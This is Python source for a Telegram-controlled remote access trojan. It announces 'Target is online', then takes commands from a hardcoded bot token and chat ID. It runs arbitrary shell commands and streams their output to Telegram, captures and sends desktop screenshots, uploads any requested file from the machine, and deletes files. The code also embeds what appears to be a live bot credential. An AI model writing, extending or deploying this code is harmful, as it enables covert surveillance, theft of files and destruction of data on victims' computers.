import platform
import socket
import requests
import time
import subprocess
import threading
import queue
import os
import pyscreenshot as ImageGrab  # pip install pyscreenshot Pillow

TELEGRAM_BOT_TOKEN = "8688107394:AAFmJWVB6xm503axixBRV9ge77pWL6zNRqA"
TELEGRAM_CHAT_ID = "8619675009"

class DynamicCMD:
    def __init__(self):
        self.process = None
        self.active_stream = False

    def send_telegram(self, text):
        """Send direct text messages to Telegram"""
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload = {"chat_id": TELEGRAM_CHAT_ID, "text": text, "parse_mode": "Markdown"}
        requests.post(url, json=payload)

    def send_document(self, file_path):
        """Upload and send a file/document to Telegram"""
        if not os.path.exists(file_path):
            self.send_telegram(f"❌ **File not found:** `{file_path}`")
            return

        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendDocument"
        try:
            with open(file_path, "rb") as file:
                payload = {"chat_id": TELEGRAM_CHAT_ID}
                files = {"document": file}
                requests.post(url, data=payload, files=files)
        except Exception as e:
            self.send_telegram(f"❌ **Failed to upload file:** `{str(e)}`")

    def send_photo(self, photo_path):
        """Send a photo/screenshot to Telegram"""
        url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendPhoto"
        try:
            with open(photo_path, "rb") as photo:
                payload = {"chat_id": TELEGRAM_CHAT_ID}
                files = {"photo": photo}
                requests.post(url, data=payload, files=files)
        except Exception as e:
            self.send_telegram(f"❌ **Failed to send screenshot:** `{str(e)}`")

    def take_screenshot(self):
        """Capture desktop screenshot and send it"""
        screenshot_filename = "screenshot.png"
        try:
            image = ImageGrab.grab()
            image.save(screenshot_filename)
            self.send_photo(screenshot_filename)
            if os.path.exists(screenshot_filename):
                os.remove(screenshot_filename)
        except Exception as e:
            self.send_telegram(f"❌ **Screenshot error:** `{str(e)}`")

    def delete_file(self, file_path):
        """Delete a specified file from the system"""
        if os.path.exists(file_path):
            try:
                os.remove(file_path)
                self.send_telegram(f"🗑️ **File deleted successfully:** `{file_path}`")
            except Exception as e:
                self.send_telegram(f"❌ **Failed to delete file:** `{str(e)}`")
        else:
            self.send_telegram(f"⚠️ **File does not exist:** `{file_path}`")

    def run_continuous_command(self, command):
        self.active_stream = True
        
        if platform.system() == "Windows" and command.startswith("ping") and "-t" not in command:
            command += " -t"

        self.send_telegram(f"⏳ **Starting continuous command:** `{command}`\n*(Send `stop` at any time to halt)*")

        # Open subprocess
        self.process = subprocess.Popen(
            command,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1
        )

        buffer = ""
        last_send_time = time.time()

        # Read output line by line
        for line in iter(self.process.stdout.readline, ''):
            if not self.active_stream:
                break
            
            buffer += line

            # Send accumulated output every 3 seconds to stay under Telegram Rate Limits
            if time.time() - last_send_time > 3 and buffer.strip():
                self.send_telegram(f"```\n{buffer[:3900]}\n```")
                buffer = ""
                last_send_time = time.time()

        # Send remaining output in buffer upon command completion or stop
        if buffer.strip():
            self.send_telegram(f"```\n{buffer[:3900]}\n```")

        self.stop_process()

    def stop_process(self):
        """Stop the current running process"""
        if self.active_stream or (self.process and self.process.poll() is None):
            self.active_stream = False
            if self.process:
                self.process.terminate()
                self.process = None
            self.send_telegram("🛑 **Current process/Ping stopped successfully.**")
        else:
            self.send_telegram("⚠️ No active continuous process is currently running to stop.")

cmd_engine = DynamicCMD()

def listen_for_commands():
    offset = None

    while True:
        try:
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/getUpdates"
            params = {"timeout": 30, "offset": offset}
            response = requests.get(url, params=params).json()

            if "result" in response:
                for update in response["result"]:
                    offset = update["update_id"] + 1

                    if "message" in update and "text" in update["message"]:
                        chat_id = str(update["message"]["chat"]["id"])
                        text = update["message"]["text"].strip()

                        if chat_id == str(TELEGRAM_CHAT_ID):
                            cmd_lower = text.lower()

                            # Stop command check
                            if cmd_lower in ["stop", "/stop"]:
                                cmd_engine.stop_process()

                            # Screenshot command
                            elif cmd_lower in ["screenshot", "/screenshot"]:
                                cmd_engine.take_screenshot()

                            # File upload command: upload <path>
                            elif cmd_lower.startswith("upload "):
                                file_path = text[7:].strip()
                                cmd_engine.send_document(file_path)

                            # File delete command: delete <path>
                            elif cmd_lower.startswith("delete "):
                                file_path = text[7:].strip()
                                cmd_engine.delete_file(file_path)

                            else:
                                # Terminate any existing process before launching a new one
                                if cmd_engine.active_stream:
                                    cmd_engine.stop_process()

                                # Run continuous command in a separate thread
                                thread = threading.Thread(
                                    target=cmd_engine.run_continuous_command,
                                    args=(text,),
                                    daemon=True
                                )
                                thread.start()

        except Exception as e:
            time.sleep(3)

if __name__ == "__main__":
    cmd_engine.send_telegram("🚀 Target is online")
    listen_for_commands()
